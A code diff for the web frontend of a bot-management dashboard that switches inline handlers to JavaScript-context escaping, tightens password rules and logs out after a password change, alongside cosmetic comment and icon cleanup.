@@ -1718,9 +1798,9 @@ function exportLogs() {
   a.click();
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // NPM PAGE
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function loadNpm(botName) {
   const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   const page = document.getElementById('page-npm');
@@ -1789,7 +1869,7 @@ async function loadNpmForBot(botName) {
         <span style="font-weight:500;color:var(--tx-1);flex:1;">${esc(k)}</span>
         <span style="font-family:var(--font-mono);font-size:11px;color:var(--tx-3);">${esc(v)}</span>
         <span class="badge badge-blue" style="font-size:9px;">${esc(t('npm.installed'))}</span>
-        <button class="btn btn-danger btn-xs" onclick="removePkg('${esc(botName)}','${esc(k)}')" title="${esc(t('npm.removeBtn'))}"><i class="ti ti-trash"></i></button>
+        <button class="btn btn-danger btn-xs" onclick="removePkg('${escJs(botName)}','${escJs(k)}')" title="${esc(t('npm.removeBtn'))}"><i class="ti ti-trash"></i></button>
       </div>`).join('');
 
     const emptyOrRows = count ? rows : `
@@ -1814,7 +1894,7 @@ async function loadNpmForBot(botName) {
         <i class="ti ti-alert-circle" style="font-size:40px;color:var(--red);"></i>
         <div class="empty-state-title">${esc(t('npm.errorTitle'))}</div>
         <div class="empty-state-desc">${esc(e.message || t('npm.errorDesc'))}</div>
-        <button class="btn btn-primary mt-16" onclick="loadNpmForBot('${esc(botName)}')"><i class="ti ti-refresh"></i> ${esc(t('npm.retry'))}</button>
+        <button class="btn btn-primary mt-16" onclick="loadNpmForBot('${escJs(botName)}')"><i class="ti ti-refresh"></i> ${esc(t('npm.retry'))}</button>
       </div>`;
   }
 }
@@ -1837,7 +1917,7 @@ function showInstallModal() {
     </div>
     <div class="modal-footer">
       <button class="btn btn-ghost" onclick="this.closest('.modal-overlay').remove()">${esc(t('common.cancel'))}</button>
-      <button class="btn btn-primary" onclick="installPkg('${esc(botName)}')"><i class="ti ti-download"></i> ${esc(t('npm.installBtn'))}</button>
+      <button class="btn btn-primary" onclick="installPkg('${escJs(botName)}')"><i class="ti ti-download"></i> ${esc(t('npm.installBtn'))}</button>
     </div>
   </div>`;
   document.body.appendChild(ov);
@@ -1871,9 +1951,9 @@ async function removePkg(botName, pkg) {
   });
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // BACKUPS PAGE
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function loadBackups() {
   const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   const page = document.getElementById('page-backups');
@@ -1980,9 +2060,9 @@ async function delBackup(id) {
   catch (e) { toast('error', t('toasts.error'), e.message); }
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // SETTINGS PAGE
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function loadSettings() {
   const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   const page = document.getElementById('page-settings');
@@ -2048,8 +2128,8 @@ async function loadSettings() {
               <div class="card-header"><span class="card-title"><i class="ti ti-lock"></i>${esc(_t('settingsPage.changePassword'))}</span></div>
               <div class="card-body">
                 <div class="form-group"><label class="form-label">${esc(_t('settingsPage.currentPwd'))}</label><input class="form-control" type="password" id="s-curpwd"/></div>
-                <div class="form-group"><label class="form-label">${esc(_t('settingsPage.newPwd'))}</label><input class="form-control" type="password" id="s-newpwd"/></div>
-                <div class="form-group"><label class="form-label">${esc(_t('settingsPage.confirmPwd'))}</label><input class="form-control" type="password" id="s-cfpwd"/></div>
+                <div class="form-group"><label class="form-label">${esc(_t('settingsPage.newPwd'))}</label><input class="form-control" type="password" id="s-newpwd" maxlength="72"/></div>
+                <div class="form-group"><label class="form-label">${esc(_t('settingsPage.confirmPwd'))}</label><input class="form-control" type="password" id="s-cfpwd" maxlength="72"/></div>
               </div>
               <div class="card-footer"><button class="btn btn-primary" onclick="changePassword()"><i class="ti ti-key"></i>${esc(_t('settingsPage.change'))}</button></div>
             </div>
@@ -2069,7 +2149,7 @@ async function loadSettings() {
                 <div class="lang-picker" id="settings-lang-picker">
                   ${window.NexusI18n ? window.NexusI18n.SUPPORTED.map(code => `
                     <button type="button" class="lang-pick${NexusI18n.current()===code?' active':''}" data-lang="${code}">
-                      <span class="lang-flag">${window.NexusI18n.supportedFlags[code]}</span>
+                      <span class="lang-code">${window.NexusI18n.supportedCodes[code]}</span>
                       <span class="lang-name">${window.NexusI18n.supportedNames[code]}</span>
                     </button>`).join('') : ''}
                 </div>
@@ -2166,7 +2246,7 @@ async function loadSettings() {
     renderSoftwarePanel();
     // Refresh the version badges in #about-version / #about-version-help so
     // they don't stay at the default "—" placeholder if the user navigates
-    // to Settings → About before the initial refreshVersionBadge() call
+    // to Settings -> About before the initial refreshVersionBadge() call
     // completes (or before any data is in cache).
     refreshVersionBadge();
   } catch (e) {
@@ -2174,9 +2254,9 @@ async function loadSettings() {
   }
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // SOFTWARE / UPDATE PANEL
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 let _updatePollTimer = null;
 let _updateBootNotice = false;
 
@@ -2340,10 +2420,10 @@ function buildProgressHTML(s) {
   const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   if (!s.steps) return '';
   const stepRows = s.steps.map(step => {
-    let icon = '○', color = 'var(--tx-3)';
-    if (step.status === 'done')    { icon = '✓'; color = 'var(--green)'; }
-    else if (step.status === 'running') { icon = '⟳'; color = 'var(--blue)'; }
-    else if (step.status === 'failed')  { icon = '✕'; color = 'var(--red)'; }
+    let icon = '<i class="ti ti-clock"></i>', color = 'var(--tx-3)';
+    if (step.status === 'done')    { icon = '<i class="ti ti-check"></i>'; color = 'var(--green)'; }
+    else if (step.status === 'running') { icon = '<i class="ti ti-loader-2"></i>'; color = 'var(--blue)'; }
+    else if (step.status === 'failed')  { icon = '<i class="ti ti-x"></i>'; color = 'var(--red)'; }
     const currentRow = step.status === 'running' ? 'font-weight:600;color:var(--tx-1);' : 'color:var(--tx-2);';
     return `<div style="display:flex;align-items:center;gap:10px;padding:6px 0;${currentRow}"><span style="width:18px;color:${color};font-weight:700;">${icon}</span><span style="flex:1;">${esc(step.label)}</span>${step.error ? `<span style="color:var(--red);font-size:11px;">${esc(step.error)}</span>` : ''}</div>`;
   }).join('');
@@ -2365,7 +2445,7 @@ function buildProgressHTML(s) {
           <i class="ti ${s.status === 'success' ? 'ti-circle-check' : s.status === 'failed' ? 'ti-alert-circle' : 'ti-loader-2'}"></i>
           ${esc(headerLabel)}
         </span>
-        <span style="font-family:var(--font-mono);font-size:11px;color:var(--tx-3);">v${esc(fromVer)} → v${esc(toVer)}</span>
+        <span style="font-family:var(--font-mono);font-size:11px;color:var(--tx-3);">v${esc(fromVer)} -> v${esc(toVer)}</span>
       </div>
       <div class="card-body">
         <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px;">
@@ -2383,7 +2463,7 @@ function bindSoftwareActions(s) {
   // Currently all actions are inline; nothing to bind.
 }
 
-// ── Language picker ────────────────────────────────────
+// -- Language picker ------------------------------------
 function bindLanguagePicker(rootSel) {
   const root = document.querySelector(rootSel);
   if (!root) return;
@@ -2507,9 +2587,9 @@ async function ackUpdate() {
   renderSoftwarePanel();
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // VERSION BADGE + UPDATE NOTIFICATIONS
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function refreshVersionBadge() {
   const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   try {
@@ -2582,7 +2662,7 @@ function dismissUpdateBanner() {
 }
 
 function openSoftwareSettings() {
-  // Navigate to settings → Logiciel
+  // Navigate to settings -> Logiciel
   navigate('settings');
   setTimeout(() => {
     const navItem = document.querySelector('.settings-nav-item[onclick*="software"]');
@@ -2646,17 +2726,20 @@ async function changePassword() {
   const cf  = document.getElementById('s-cfpwd')?.value;
   if (!cur || !nw)   { toast('error', _t('toasts.missingFields')); return; }
   if (nw !== cf)     { toast('error', _t('toasts.pwdMismatch')); return; }
-  if (nw.length < 6) { toast('error', _t('toasts.pwdTooShort')); return; }
+  if (nw.length < 8) { toast('error', _t('toasts.pwdTooShort')); return; }
   try {
     await NexusAPI.auth.changePassword(cur, nw);
     toast('success', _t('toasts.pwdChanged'));
     ['s-curpwd','s-newpwd','s-cfpwd'].forEach(id => { const el = document.getElementById(id); if (el) el.value = ''; });
+    // The server revokes every token on password change, including this one:
+    // drop the local session now instead of letting the next API call 401.
+    await doLogout();
   } catch (e) { toast('error', _t('toasts.error'), e.message); }
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // HELP / À PROPOS PAGE
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function loadHelp() {
   const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   const page = document.getElementById('page-help');
@@ -2800,18 +2883,18 @@ async function loadHelp() {
   }
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // GLOBAL SEARCH
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 function globalSearch(q) {
   if (!q?.trim()) return;
   const match = App.bots.find(b => b.name.toLowerCase().includes(q.toLowerCase()));
   if (match) navigate('bot', { botName: match.name });
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // INIT
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 document.addEventListener('DOMContentLoaded', () => {
   // Keyboard shortcuts
   document.addEventListener('keydown', e => {
